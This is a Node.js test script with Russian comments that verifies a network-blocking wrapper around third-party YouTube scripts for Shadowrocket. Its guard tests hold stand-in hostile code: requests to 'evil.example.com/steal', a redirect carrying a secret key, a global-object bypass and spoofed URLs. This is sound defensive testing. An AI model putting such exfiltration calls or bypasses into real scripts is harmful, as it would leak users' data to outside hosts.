#!/usr/bin/env node
// Проверки перед публикацией:
//   node tools/verify.mjs
//
// 1. Сборка воспроизводима, код Maasea внутри скриптов совпадает байт-в-байт.
// 2. В коде Maasea нет новых внешних адресов (иначе — ручной разбор).
// 3. Обёртка yt-guard блокирует все известные способы выйти в сеть
//    (на подставном «враждебном» коде).
// 4. Настоящие скрипты Maasea запускаются в песочнице с API Shadowrocket.
// 5. Модуль ссылается только на свой репозиторий и тег, QUIC запрещён.
import { readFileSync } from "node:fs";
import { join, resolve } from "node:path";
import vm from "node:vm";
import { build, wrap, sha256 } from "./build.mjs";

const ROOT = resolve(import.meta.dirname, "..");
const { cfg, lock, runOn, out } = build();
const template = readFileSync(join(ROOT, "tools/guard-template.js"), "utf8");

let failed = 0, passed = 0;
async function test(name, fn) {
  try { await fn(); passed++; console.log(`  ok   ${name}`); }
  catch (e) { failed++; console.log(`  FAIL ${name}\n       ${e?.message ?? e}`); }
}
function assert(cond, msg) { if (!cond) throw new Error(msg); }

// ---------- песочница с API Shadowrocket ----------
function sandbox({ url, headers = {}, body, store = {}, argument, response, task = false } = {}) {
  const calls = { done: [], http: [], task: [], fetch: [], events: [] };
  const ctx = {
    console: { log() {} },
    URL, TextEncoder, TextDecoder, Uint8Array, ArrayBuffer, DataView, Promise, setTimeout, clearTimeout,
    $request: { url, method: "POST", headers, bodyBytes: body },
    $persistentStore: {
      read: (k) => store[k] ?? null,
      write: (v, k) => { store[k] = v; return true; },
    },
    $httpClient: Object.fromEntries(["get", "post"].map((m) =>
      [m, (o, cb) => { calls.http.push(typeof o === "string" ? o : o.url); cb?.(null, { status: 200, headers: {} }, ""); }])),
    fetch: (u) => { calls.fetch.push(String(u)); return Promise.resolve({}); },
    $done: (o) => { calls.done.push(o); },
    __YT_GUARD_EVENTS__: calls.events,
  };
  // $task есть только в Quantumult X; в Shadowrocket его нет, и по нему
  // оригинал определяет платформу — поэтому добавляем только по запросу.
  if (task) ctx.$task = { fetch: (r) => { calls.task.push(r.url); return Promise.resolve({ statusCode: 200, body: "" }); } };
  if (argument !== undefined) ctx.$argument = argument;
  if (response) ctx.$response = response;
  ctx.globalThis = ctx;
  vm.createContext(ctx);
  return { ctx, calls, store };
}
async function run(code, opts) {
  const sb = sandbox(opts);
  vm.runInContext(code, sb.ctx, { timeout: 5000 });
  await new Promise((r) => setTimeout(r, 50));
  return sb;
}
const guarded = (code) => wrap(template, {
  GUARD_VERSION: "test", UPSTREAM_REPO: "test", UPSTREAM_COMMIT: "test", UPSTREAM_PATH: "test",
  UPSTREAM_SHA256: "test", ALLOW_LIST: "test",
  CFG_JSON: JSON.stringify({ allow: cfg.allowedHosts, runOn, onesie: cfg.onesieCache }),
}, code);

const INIT = "https://rr3---sn-abc.googlevideo.com/initplayback?source=youtube&ack=1";
const API = "https://youtubei.googleapis.com/youtubei/v1/player?key=x";
const EVIL = "https://evil.example.com/steal";
const WORKER = "https://init-stream.maasea.workers.dev/?ck=SECRET&target=x";

// ---------- 1. сборка ----------
console.log("1. Сборка");
await test("код Maasea вставлен без изменений", () => {
  for (const p of cfg.scripts) {
    const orig = readFileSync(join(ROOT, "upstream", p), "utf8").replace(/\s*$/, "");
    assert(out[p].includes(orig), `${p}: оригинальный код не найден целиком`);
    assert(sha256(readFileSync(join(ROOT, "upstream", p))) === lock.files[p], `${p}: sha256 не совпадает с lock`);
  }
});
await test("файлы в репозитории совпадают со сборкой", () => {
  for (const [p, c] of Object.entries(out)) {
    assert(readFileSync(join(ROOT, p), "utf8") === c, `${p} устарел — запустите node tools/build.mjs`);
  }
});

// ---------- 2. внешние адреса в коде Maasea ----------
console.log("2. Внешние адреса в коде Maasea");
await test("нет неизвестных хостов", () => {
  const known = [...cfg.allowedHosts, ...cfg.knownRelays, ...cfg.harmlessHosts];
  const inList = (h) => known.some((d) => h === d || h.endsWith("." + d));
  for (const p of cfg.scripts) {
    const code = readFileSync(join(ROOT, "upstream", p), "utf8");
    const hosts = new Set([...code.matchAll(/(?:https?|wss?):\/\/([a-z0-9.-]+)/gi)].map((m) => m[1].toLowerCase()));
    const unknown = [...hosts].filter((h) => !inList(h));
    assert(!unknown.length, `${p}: ${unknown.join(", ")} — разберитесь, что это, и добавьте в config.json`);
  }
});

// ---------- 3. обёртка на враждебном коде ----------
console.log("3. Обёртка yt-guard");
await test("редирект на воркер → пустой ответ и стирание ключа Onesie", async () => {
  const store = { YouTubeConfig: JSON.stringify({ youtube: { clientKey: "k" }, youtubeMusic: { clientKey: "m" } }) };
  const { calls } = await run(guarded(`$done({ url: ${JSON.stringify(WORKER)} })`), { url: INIT, store });
  assert(calls.done.length === 1 && calls.done[0].response?.status === 200, "ожидался пустой ответ 200");
  const left = JSON.parse(store.YouTubeConfig);
  assert(!left.youtube && left.youtubeMusic, "ключ youtube должен быть удалён, youtubeMusic — остаться");
});
await test("редирект на googlevideo.com пропускается", async () => {
  const to = "https://rr1---sn-x.googlevideo.com/videoplayback?a=1";
  const { calls } = await run(guarded(`$done({ url: ${JSON.stringify(to)} })`), { url: INIT });
  assert(calls.done[0].url === to, "разрешённый редирект не должен меняться");
});
await test("Location на чужой хост в ответе → ответ без изменений", async () => {
  const { calls } = await run(guarded(`$done({ response: { status: 302, headers: { location: ${JSON.stringify(EVIL)} } } })`), { url: API });
  assert(JSON.stringify(calls.done[0]) === "{}", "ожидался $done({})");
});
await test("относительный Location пропускается", async () => {
  const { calls } = await run(guarded(`$done({ headers: { Location: "/watch?v=1" } })`), { url: API });
  assert(calls.done[0].headers?.Location === "/watch?v=1", "относительный Location не должен блокироваться");
});
await test("$httpClient / $task / fetch к чужому хосту блокируются, к YouTube — нет", async () => {
  const { calls } = await run(guarded(`
    $httpClient.get(${JSON.stringify(EVIL)}, () => {});
    $httpClient.post({ url: ${JSON.stringify(WORKER)} }, () => {});
    $task.fetch({ url: ${JSON.stringify(EVIL)} }).catch(() => {});
    fetch(${JSON.stringify(EVIL)}).catch(() => {});
    $httpClient.get("https://www.youtube.com/api/timedtext", () => {});
    $done({});`), { url: API, task: true });
  assert(calls.http.length === 1 && calls.http[0].includes("youtube.com"), `пропущено: ${calls.http.join(", ")}`);
  assert(!calls.task.length && !calls.fetch.length, "task/fetch не должны были дойти до сети");
});
await test("обход через Function('return this')() тоже блокируется", async () => {
  const { calls } = await run(guarded(`
    const g = Function("return this")();
    g.$httpClient.get(${JSON.stringify(EVIL)}, () => {});
    g.$done({ url: ${JSON.stringify(WORKER)} });`), { url: INIT });
  assert(!calls.http.length, "запрос через глобальный объект дошёл до сети");
  assert(calls.done[0].response?.status === 200, "редирект через глобальный $done не заблокирован");
});
await test("после $done глобальные API возвращаются как были", async () => {
  const { ctx } = await run(guarded(`$done({})`), { url: API });
  ctx.$httpClient.get(EVIL, () => {});
  assert(ctx.__YT_GUARD_EVENTS__.length === 0, "глобальный $httpClient остался подменённым");
});
await test("на чужом хосте код не запускается вовсе", async () => {
  const { calls } = await run(guarded(`$httpClient.get("https://www.youtube.com/", () => {}); $done({ body: "x" });`),
    { url: "https://youtubei.googleapis.com.evil.com/youtubei/v1/player" });
  assert(!calls.http.length && JSON.stringify(calls.done) === "[{}]", "код выполнился вне MITM-хостов");
});
await test("хитрые адреса считаются чужими", async () => {
  const tricky = [
    "https://youtube.com.evil.com/", "https://evilyoutube.com/", "https://evil.com\\@youtube.com/",
    "https://[::1]/", "javascript:alert(1)", "//evil.com/", "https://evil.com#.youtube.com",
  ];
  for (const t of tricky) {
    const { calls } = await run(guarded(`$httpClient.get(${JSON.stringify(t)}, () => {}); $done({});`), { url: API });
    assert(!calls.http.length, `пропущен адрес ${t}`);
  }
  const ok = ["https://YOUTUBE.COM./x", "https://i.ytimg.com/vi/x.jpg", "https://www.youtube.com:443/x"];
  for (const t of ok) {
    const { calls } = await run(guarded(`$httpClient.get(${JSON.stringify(t)}, () => {}); $done({});`), { url: API });
    assert(calls.http.length === 1, `ошибочно заблокирован ${t}`);
  }
});

// ---------- 4. настоящие скрипты ----------
console.log("4. Скрипты Maasea в песочнице");
const req = out["Script/Youtube/youtube.request.js"];
const resp = out["Script/Youtube/youtube.response.js"];
await test("log_event: убирает content-encoding, в сеть не ходит", async () => {
  const { calls } = await run(req, {
    url: "https://youtubei.googleapis.com/youtubei/v1/log_event?alt=proto",
    headers: { "User-Agent": "com.google.ios.youtube/20.10", "Content-Encoding": "gzip", "x-test": "1" },
    body: new Uint8Array(0),
  });
  assert(calls.done.length === 1, "ожидался ровно один вызов $done");
  const h = calls.done[0].headers ?? {};
  assert(!Object.keys(h).some((k) => k.toLowerCase() === "content-encoding") && h["x-test"] === "1", `заголовки: ${JSON.stringify(h)}`);
  assert(!calls.http.length && !calls.task.length && !calls.fetch.length && !calls.events.length, "были сетевые попытки");
});
await test("initplayback без ключа: пустой ответ, в сеть не ходит", async () => {
  const { calls } = await run(req, { url: INIT, headers: { "User-Agent": "com.google.ios.youtube/20.10" }, body: new Uint8Array(0) });
  assert(calls.done.length === 1, "ожидался ровно один вызов $done");
  assert(!calls.done[0].url, "не должно быть редиректа");
  assert(!calls.http.length && !calls.task.length && !calls.fetch.length, "были сетевые попытки");
});
await test("ответ player загружается и завершает работу", async () => {
  const { calls } = await run(resp, {
    url: API, headers: { "User-Agent": "com.google.ios.youtube/20.10" },
    argument: JSON.stringify({ captionLang: "off", blockUpload: true, blockImmersive: true, blockShorts: false, debug: false }),
    response: { status: 200, headers: { "Content-Type": "application/x-protobuf" }, bodyBytes: new Uint8Array(0) },
  });
  assert(calls.done.length === 1, `ожидался ровно один вызов $done, было ${calls.done.length}`);
  assert(!calls.http.length && !calls.task.length && !calls.fetch.length && !calls.events.length, "были сетевые попытки");
});

// ---------- 5. модуль ----------
console.log("5. Модуль");
const mod = out[cfg.module.output];
await test("скрипты подключаются только из своего репозитория по тегу", () => {
  const paths = [...mod.matchAll(/script-path=([^,\s]+)/g)].map((m) => m[1]);
  const prefix = `https://raw.githubusercontent.com/${cfg.github.owner}/${cfg.github.repo}/${cfg.version}/`;
  assert(paths.length === 3, `ожидалось 3 скрипта, найдено ${paths.length}`);
  for (const p of paths) assert(p.startsWith(prefix) && out[p.slice(prefix.length)], `чужая или несуществующая ссылка: ${p}`);
  assert(/^v\d+\.\d+\.\d+$/.test(cfg.version), "version должна быть тегом вида v1.2.3, а не веткой");
});
await test("QUIC для YouTube запрещён", () => {
  assert(/AND,\(\(DOMAIN-SUFFIX,googlevideo\.com\),\(PROTOCOL,UDP\)\),REJECT/.test(mod), "нет правила для googlevideo.com");
  assert(/AND,\(\(DOMAIN,youtubei\.googleapis\.com\),\(PROTOCOL,UDP\)\),REJECT/.test(mod), "нет правила для youtubei.googleapis.com");
});
await test("все аргументы объявлены и используются", () => {
  const declared = (/^#!arguments=(.*)$/m.exec(mod)?.[1] ?? "").split(",").map((p) => p.split(":")[0].trim());
  const used = [...new Set([...mod.matchAll(/\{\{\{([^}]+)\}\}\}/g)].map((m) => m[1]))];
  const missing = used.filter((u) => !declared.includes(u));
  const unused = declared.filter((d) => !used.includes(d));
  assert(!missing.length && !unused.length, `не объявлены: ${missing.join(", ")}; не используются: ${unused.join(", ")}`);
});
await test("шаблоны [Script] и [MITM] совпадают с модулем Maasea", () => {
  const up = readFileSync(join(ROOT, "upstream/YouTube.Enhance.sgmodule"), "utf8");
  const patterns = (t) => [...t.matchAll(/pattern=([^,]+)/g)].map((m) => m[1]);
  assert(JSON.stringify(patterns(up)) === JSON.stringify(patterns(mod)), "шаблоны pattern= разошлись с оригиналом");
  const host = (t) => /^hostname\s*=.*$/m.exec(t)?.[0];
  assert(host(up) === host(mod), "[MITM] разошёлся с оригиналом");
});

console.log(`\n${passed} прошло, ${failed} не прошло`);
process.exit(failed ? 1 : 0);
